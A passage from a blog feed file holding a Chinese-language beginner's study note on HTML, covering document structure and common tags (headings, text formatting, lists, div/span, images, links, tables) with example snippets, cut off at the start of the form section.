      
      
        <tags>
            
            <tag> 学习笔记 </tag>
            
            <tag> php </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>HTML学习笔记</title>
      <link href="/2024/12/25/HTML%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
      <url>/2024/12/25/HTML%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</url>
      
        <content type="html"><![CDATA[<h1 id="HTML简介"><a href="#HTML简介" class="headerlink" title="HTML简介"></a>HTML简介</h1><p>   HTML 是用来描述网页的一种语言。</p><ul><li><p>HTML 指的是超文本标记语言: <strong>H</strong>yper<strong>T</strong>ext <strong>M</strong>arkup <strong>L</strong>anguage</p></li><li><p>HTML 不是一种编程语言，而是一种<strong>标记</strong>语言</p></li><li><p>标记语言是一套<strong>标记标签</strong> (markup tag)</p></li><li><p>HTML 使用标记标签来<strong>描述</strong>网页</p></li><li><p>HTML 文档包含了HTML <strong>标签</strong>及<strong>文本</strong>内容</p></li><li><p>HTML文档也叫做 <strong>web 页面</strong></p><h1 id="HTML的学习"><a href="#HTML的学习" class="headerlink" title="HTML的学习"></a>HTML的学习</h1><h2 id="基础结构和语法"><a href="#基础结构和语法" class="headerlink" title="基础结构和语法"></a>基础结构和语法</h2><h3 id="基础结构例子"><a href="#基础结构例子" class="headerlink" title="基础结构例子"></a>基础结构例子</h3><p><img src="/../image/HTML%E4%BE%8B%E5%AD%90.png"></p></li></ul><h3 id="DOCTYPE"><a href="#DOCTYPE" class="headerlink" title="DOCTYPE"></a>DOCTYPE</h3><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">html</span>&gt;</span> //声明为 HTML5 文档 需要写在首行<br></code></pre></td></tr></table></figure><h3 id="标签"><a href="#标签" class="headerlink" title="标签"></a>标签</h3><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs xml">无属性标签 <span class="hljs-tag">&lt;<span class="hljs-name">标签名</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">标签名</span>&gt;</span><br><br>有属性标签 <span class="hljs-tag">&lt;<span class="hljs-name">标签名</span> <span class="hljs-attr">属性名</span>=<span class="hljs-string">&quot;属性值&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">标签名</span>&gt;</span><br></code></pre></td></tr></table></figure><h3 id="整体结构"><a href="#整体结构" class="headerlink" title="整体结构"></a>整体结构</h3><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span>...<span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span> 表示是一个html网页<br><br><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span>...<span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span> 头部信息，如果需要使用css样式要写在里面<br> <br><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span>...<span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span> 身体部分，主要html代码要写在里面<br></code></pre></td></tr></table></figure><h3 id="自写html代码记录"><a href="#自写html代码记录" class="headerlink" title="自写html代码记录"></a>自写html代码记录</h3><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-comment">&lt;!-- 定义标题用&lt;h1&gt;标签，定义图片用&lt;img&gt;标签 --&gt;</span><br><span class="hljs-comment">&lt;!-- 定义样式在标签上使用style属性 --&gt;</span><br><span class="hljs-comment">&lt;!-- 文档申明，表示html5 --&gt;</span><br><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">html</span>&gt;</span><br><span class="hljs-comment">&lt;!-- 当前语言是英文 --&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">html</span> <span class="hljs-attr">lang</span>=<span class="hljs-string">&quot;en&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><br>    <span class="hljs-comment">&lt;!-- 告诉浏览器采用utf-8 --&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">charset</span>=<span class="hljs-string">&quot;UTF-8&quot;</span>&gt;</span><br>    <span class="hljs-comment">&lt;!-- 解决IE浏览器兼容性问题 --&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;viewport&quot;</span> <span class="hljs-attr">content</span>=<span class="hljs-string">&quot;width=device-width, initial-scale=1.0&quot;</span>&gt;</span><br>    <span class="hljs-comment">&lt;!-- 网页标题，显示在浏览器的标签页中 --&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>Hello HTML<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">h1</span> <span class="hljs-attr">style</span>=<span class="hljs-string">&quot;color: red&quot;</span>&gt;</span>HTML入门<span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span><br>    <span class="hljs-comment">&lt;!-- src属性：定义要展示的图片路径.alt属性：如果图片展示不出来要显示的文件内容 --&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;图片资源\nailong.jpg&quot;</span> <span class="hljs-attr">alt</span>=<span class="hljs-string">&quot;奶龙&quot;</span><span class="hljs-attr">width</span>=<span class="hljs-string">&quot;300&quot;</span> <span class="hljs-attr">height</span>=<span class="hljs-string">&quot;300&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br></code></pre></td></tr></table></figure><h2 id="常用的HTML标签"><a href="#常用的HTML标签" class="headerlink" title="常用的HTML标签"></a>常用的HTML标签</h2><h3 id="标题标签"><a href="#标题标签" class="headerlink" title="标题标签"></a>标题标签</h3><p>标题标签：通过h1~h6来定义的。</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">h1</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span>~<span class="hljs-tag">&lt;<span class="hljs-name">h6</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">h6</span>&gt;</span> <br></code></pre></td></tr></table></figure><h3 id="段落、换行、水平线标签"><a href="#段落、换行、水平线标签" class="headerlink" title="段落、换行、水平线标签"></a>段落、换行、水平线标签</h3><p>段落标签：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>...<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span> 一对<span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span>标签就是一个自然段，两对就是两个自然段会自动换行<br>常用属性：<br>align 对齐方式：<br>left 左对齐<br>right 右对齐<br>center 居中对齐<br>justify 两端对齐<br>例如：<br><span class="hljs-tag">&lt;<span class="hljs-name">p</span> <span class="hljs-attr">align</span>=<span class="hljs-string">&quot;left&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span> <br>左对齐段落<br></code></pre></td></tr></table></figure><p>换行标签：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span> 一个换行标签换一行<br></code></pre></td></tr></table></figure><p>水平线标签：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">hr</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">hr</span>&gt;</span> 效果为在页面中添加一条水平线<br>常用属性：<br>color：设置水平线颜色；<br>    width：设置水平线长度；<br>    size：设置水平线高度；<br>    align：设置水平线对齐方式(默认居中)，可取值 left 或 right。<br>例如：<br><span class="hljs-tag">&lt;<span class="hljs-name">hr</span> <span class="hljs-attr">color</span>=<span class="hljs-string">&quot;red&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">hr</span>&gt;</span><br>红色水平线<br></code></pre></td></tr></table></figure><h3 id="文本标签"><a href="#文本标签" class="headerlink" title="文本标签"></a>文本标签</h3><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">b</span>&gt;</span>...<span class="hljs-tag">&lt;/<span class="hljs-name">b</span>&gt;</span>字体加粗 <br><span class="hljs-tag">&lt;<span class="hljs-name">strong</span>&gt;</span>...<span class="hljs-tag">&lt;/<span class="hljs-name">strong</span>&gt;</span>定义加重语气 和加粗没区别<br><span class="hljs-tag">&lt;<span class="hljs-name">i</span>&gt;</span>...<span class="hljs-tag">&lt;/<span class="hljs-name">i</span>&gt;</span>斜体  <br><span class="hljs-tag">&lt;<span class="hljs-name">em</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">em</span>&gt;</span>定义着重字体 和斜体没区别<br><span class="hljs-tag">&lt;<span class="hljs-name">u</span>&gt;</span>...<span class="hljs-tag">&lt;/<span class="hljs-name">u</span>&gt;</span>下划线<br><span class="hljs-tag">&lt;<span class="hljs-name">s</span>&gt;</span>...<span class="hljs-tag">&lt;/<span class="hljs-name">s</span>&gt;</span>删除线 <br><span class="hljs-tag">&lt;<span class="hljs-name">del</span>&gt;</span>...&lt;\del&gt;删除线  和删除线无区别<br><span class="hljs-tag">&lt;<span class="hljs-name">sub</span>&gt;</span>...<span class="hljs-tag">&lt;/<span class="hljs-name">sub</span>&gt;</span>下标例如：x<span class="hljs-tag">&lt;<span class="hljs-name">sub</span>&gt;</span>2<span class="hljs-tag">&lt;/<span class="hljs-name">sub</span>&gt;</span>得到x₂<br><span class="hljs-tag">&lt;<span class="hljs-name">sup</span>&gt;</span>...<span class="hljs-tag">&lt;/<span class="hljs-name">sup</span>&gt;</span>上标例如：x<span class="hljs-tag">&lt;<span class="hljs-name">sup</span>&gt;</span>2<span class="hljs-tag">&lt;/<span class="hljs-name">sup</span>&gt;</span>得到x²<br><br><span class="hljs-tag">&lt;<span class="hljs-name">font</span>&gt;</span>...<span class="hljs-tag">&lt;/<span class="hljs-name">font</span>&gt;</span>字体标签<br>常用属性： <br>color颜色<br>face字体<br>size字号<br>例如：<span class="hljs-tag">&lt;<span class="hljs-name">font</span> <span class="hljs-attr">color</span>=<span class="hljs-string">&quot;red&quot;</span> <span class="hljs-attr">face</span>=<span class="hljs-string">&quot;黑体&quot;</span> <span class="hljs-attr">size</span>=<span class="hljs-string">&quot;7&quot;</span>&gt;</span>字体标签<span class="hljs-tag">&lt;/<span class="hljs-name">font</span>&gt;</span><br>网页上显示字体标签，并修改字体为宋体，颜色为红色，字号为7<br></code></pre></td></tr></table></figure><h3 id="列表"><a href="#列表" class="headerlink" title="列表"></a>列表</h3><p>无序列表：</p><figure class="highlight xquery"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs xquery">无序列表标签:<br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">ul</span>&gt;</span></span><br><span class="language-xml">        </span><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">li</span>&gt;</span>无序列表元素1<span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span></span><span class="language-xml"></span><br><span class="language-xml">        </span><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">li</span>&gt;</span>无序列表元素2<span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span></span><span class="language-xml"></span><br><span class="language-xml">        </span><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">li</span>&gt;</span>无序列表元素3<span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span></span><span class="language-xml"></span><br><span class="language-xml">    <span class="hljs-tag">&lt;/<span class="hljs-name">ul</span>&gt;</span></span><br>常用属性：<br>type=<span class="hljs-string">&quot;属性值&quot;</span> 列表的序号<br>属性值：<br>disc实心原点(默认)<br>square实心方点<br>circle空心圆<br><br>列表之间是可以嵌套的<br>li里面什么都能放，甚至可以再放一个ul<br>例如：<br> <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">ul</span>&gt;</span></span><br><span class="language-xml">    </span><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">li</span>&gt;</span></span><br><span class="language-xml">        </span><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">ul</span>&gt;</span></span><br><span class="language-xml">            </span><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">li</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span></span><span class="language-xml"></span><br><span class="language-xml">        <span class="hljs-tag">&lt;/<span class="hljs-name">ul</span>&gt;</span></span><span class="language-xml"></span><br><span class="language-xml">    <span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span></span><span class="language-xml"></span><br><span class="language-xml">  <span class="hljs-tag">&lt;/<span class="hljs-name">ul</span>&gt;</span></span><br>  <br>  <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">ul</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;circle&quot;</span>&gt;</span></span><br><span class="language-xml">  </span><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">li</span>&gt;</span>...<span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span></span><span class="language-xml"></span><br><span class="language-xml">  </span><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">li</span>&gt;</span>...<span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span></span><span class="language-xml"></span><br><span class="language-xml">  <span class="hljs-tag">&lt;/<span class="hljs-name">ul</span>&gt;</span></span><br>  元素前有空心圆图标<br></code></pre></td></tr></table></figure><p>有序列表：</p><figure class="highlight xquery"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs xquery">有序列表标签：<br>    <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">ol</span>&gt;</span></span><br><span class="language-xml">        </span><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">li</span>&gt;</span>有序列表元素1<span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span></span><span class="language-xml"></span><br><span class="language-xml">        </span><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">li</span>&gt;</span>有序列表元素2<span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span></span><span class="language-xml"></span><br><span class="language-xml">        </span><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">li</span>&gt;</span>有序列表元素3<span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span></span><span class="language-xml"></span><br><span class="language-xml">    <span class="hljs-tag">&lt;/<span class="hljs-name">ol</span>&gt;</span></span><br>常用属性：<br>type=<span class="hljs-string">&quot;属性值&quot;</span>列表的序号<br>属性值：<br><span class="hljs-number">1</span>阿拉伯数字(默认)<br>a小写字母<br>    A大写字母<br>    i小写罗马字母<br>    I大写罗马字母 <br>例如：<br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">ol</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;a&quot;</span>&#x27;&gt;</span></span><br><span class="language-xml"></span><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">li</span>&gt;</span>...<span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span></span><span class="language-xml"></span><br><span class="language-xml"></span><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">li</span>&gt;</span>...<span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span></span><span class="language-xml"></span><br><span class="language-xml"><span class="hljs-tag">&lt;/<span class="hljs-name">ol</span>&gt;</span></span><br>有序列表从a开始编号<br></code></pre></td></tr></table></figure><h3 id="div和span标签"><a href="#div和span标签" class="headerlink" title="div和span标签"></a>div和span标签</h3><p>div标签：</p><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs applescript">&lt;<span class="hljs-keyword">div</span>&gt;...&lt;/<span class="hljs-keyword">div</span>&gt;<br>&lt;<span class="hljs-keyword">div</span>&gt; 是一个块元素<br>&lt;<span class="hljs-keyword">div</span>&gt; 元素在语义上不表示任何特定类型的内容<br><span class="hljs-keyword">div</span> 可以将内容分组，从而可以使用 <span class="hljs-built_in">class</span> 或是 <span class="hljs-built_in">id</span> 属性方便的定义内容的格式，<br>也可以在一段文档中划分标记出使用另一种语言书写的内容（使用 lang 属性）<br></code></pre></td></tr></table></figure><p>span标签：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">span</span>&gt;</span>...<span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">span</span>&gt;</span> 则是行内元素<br>可以用来编组元素以达到某种样式意图（通过使用类或者 id 属性）<br></code></pre></td></tr></table></figure><p>总结：</p><ul><li>div 标签，是用来布局的，但是现在<strong>一行只能放一个 div</strong>；</li><li>div 的开始标签和结束标签都不能省略；</li><li>span 标签，也是用来布局的，一行上可以放好多个 span；</li><li>span 的开始标签和结束标签都不能省略；</li></ul><h3 id="img图片标签"><a href="#img图片标签" class="headerlink" title="img图片标签"></a>img图片标签</h3><figure class="highlight maxima"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs maxima">&lt;img&gt;<br>常用属性：<br>src设置图片路径<br><span class="hljs-built_in">title</span>当鼠标停在图片上的文字<br><span class="hljs-built_in">width</span>设置图片宽度<br><span class="hljs-built_in">height</span>设置图片高度<br><span class="hljs-built_in">border</span>设置图片边框大小<br>alt设置当前指定路径找不到图片时，用来代替显示的文本内容<br>align对齐方式<br>例如：<br>&lt;img src=<span class="hljs-string">&quot;./奶龙.png&quot;</span> <span class="hljs-built_in">width</span>=<span class="hljs-string">&quot;100&quot;</span> <span class="hljs-built_in">height</span>=<span class="hljs-string">&quot;150&quot;</span> alt=<span class="hljs-string">&quot;找不到图片&quot;</span>&gt;<br></code></pre></td></tr></table></figure><h3 id="a超链接标签"><a href="#a超链接标签" class="headerlink" title="a超链接标签"></a>a超链接标签</h3><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver">&lt;<span class="hljs-keyword">a</span>&gt;&lt;/<span class="hljs-keyword">a</span>&gt;用于从一个页面链接到另外一个页面<br>常用属性：<br>href页面或者文件地址，如果设置为<span class="hljs-comment">#则不会跳转到其他页面</span><br>target规定在何处打开链接文档<br>值        描述<br><span class="hljs-title">_blank</span>在新窗口打开被链接的页面<br><span class="hljs-title">_self</span>默认设置，在当前的页面/框架打开被链接的页面<br><span class="hljs-title">_parent</span>在父框架集中打开被链接的页面<br><span class="hljs-title">_top</span>在整个窗口中打开被链接的页面<br>framename在指定框架中打开被链接的页面<br>例如：<br>&lt;<span class="hljs-keyword">a</span> href=<span class="hljs-string">&quot;./pages/introduction.html&quot;</span> target=<span class="hljs-string">&quot;_blank&quot;</span>&gt;introduction&lt;/<span class="hljs-keyword">a</span>&gt;<br>表示新开页面打开网站<br></code></pre></td></tr></table></figure><h3 id="表格"><a href="#表格" class="headerlink" title="表格"></a>表格</h3><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs css">表格标签：<br>&lt;<span class="hljs-selector-tag">table</span>&gt;&lt;/<span class="hljs-selector-tag">table</span>&gt;<br><span class="hljs-selector-tag">tr</span>表示表格中的行（每一行可以包含多个<span class="hljs-selector-tag">th</span>和<span class="hljs-selector-tag">tr</span>）<br><span class="hljs-selector-tag">td</span>表示表格中的标准单元格<br><span class="hljs-selector-tag">th</span>表示表格中的表头单元格（具有标题的效果，字体加粗，居中显示）<br><br><span class="hljs-selector-tag">table</span>常用属性：<br><span class="hljs-attribute">border</span>设置边框，属性值为像素值<br>cellspacing设置单元格边框之间的间距<br>cellpadding设置单元格与单元内容之间的间距<br><span class="hljs-attribute">width</span>设置表格宽度<br><span class="hljs-attribute">height</span>设置表格高度<br>align设置表格在网页中的水平对齐方式：<br><span class="hljs-attribute">left</span>居左<br>center居中<br><span class="hljs-attribute">right</span>居右<br><br> <span class="hljs-selector-tag">tr</span>和<span class="hljs-selector-tag">th</span> 常用属性 <br>       align 每行中文本内容的水平方向对齐方式<br>       valign 每行中文本内容的垂直方向对齐方式（<span class="hljs-attribute">top</span> <span class="hljs-attribute">bottom</span> middle）<br>       bgcolor 设置行的背景颜色<br>       <br>       <br>    合并单元格：<br>    &lt;<span class="hljs-selector-tag">td</span>&gt;的colspan和rowspan分别规定单元格横跨的列数和行数<br>    纵向合并 rowspan<br>    横向合并 colspan<br></code></pre></td></tr></table></figure><p>自写表格：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">table</span> <span class="hljs-attr">border</span>=<span class="hljs-string">&quot;1&quot;</span> <span class="hljs-attr">align</span>=<span class="hljs-string">&quot;center&quot;</span>&gt;</span><br>       <span class="hljs-tag">&lt;<span class="hljs-name">tr</span>&gt;</span><br>           <span class="hljs-tag">&lt;<span class="hljs-name">th</span>&gt;</span>列标题1<span class="hljs-tag">&lt;/<span class="hljs-name">th</span>&gt;</span><br>           <span class="hljs-tag">&lt;<span class="hljs-name">th</span>&gt;</span>列标题2<span class="hljs-tag">&lt;/<span class="hljs-name">th</span>&gt;</span><br>           <span class="hljs-tag">&lt;<span class="hljs-name">th</span>&gt;</span>列标题3<span class="hljs-tag">&lt;/<span class="hljs-name">th</span>&gt;</span><br>       <span class="hljs-tag">&lt;/<span class="hljs-name">tr</span>&gt;</span><br>       <span class="hljs-tag">&lt;<span class="hljs-name">tr</span>&gt;</span><br>           <span class="hljs-tag">&lt;<span class="hljs-name">td</span>&gt;</span>元素 1<span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span><br>           <span class="hljs-tag">&lt;<span class="hljs-name">td</span>&gt;</span>元素 2<span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span><br>           <span class="hljs-tag">&lt;<span class="hljs-name">td</span>&gt;</span>元素 3<span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span><br>       <span class="hljs-tag">&lt;/<span class="hljs-name">tr</span>&gt;</span><br>       <span class="hljs-tag">&lt;<span class="hljs-name">tr</span>&gt;</span><br>           <span class="hljs-tag">&lt;<span class="hljs-name">td</span>&gt;</span>元素 21<span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span><br>           <span class="hljs-tag">&lt;<span class="hljs-name">td</span>&gt;</span>元素 22<span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span><br>           <span class="hljs-tag">&lt;<span class="hljs-name">td</span>&gt;</span>元素 23<span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span><br>       <span class="hljs-tag">&lt;/<span class="hljs-name">tr</span>&gt;</span><br>       <span class="hljs-tag">&lt;<span class="hljs-name">tr</span>&gt;</span><br>           <span class="hljs-tag">&lt;<span class="hljs-name">td</span>&gt;</span>元素 31<span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span><br>           <span class="hljs-tag">&lt;<span class="hljs-name">td</span>&gt;</span>元素 32<span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span><br>           <span class="hljs-tag">&lt;<span class="hljs-name">td</span>&gt;</span>元素 33<span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span><br>       <span class="hljs-tag">&lt;/<span class="hljs-name">tr</span>&gt;</span><br>   <span class="hljs-tag">&lt;/<span class="hljs-name">table</span>&gt;</span><br></code></pre></td></tr></table></figure><p>效果图：</p><p><img src="/../image/%E8%A1%A8%E6%A0%BC%E4%BE%8B%E5%AD%90.png"></p><h3 id="form表单标签"><a href="#form表单标签" class="headerlink" title="form表单标签"></a>form表单标签</h3><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs 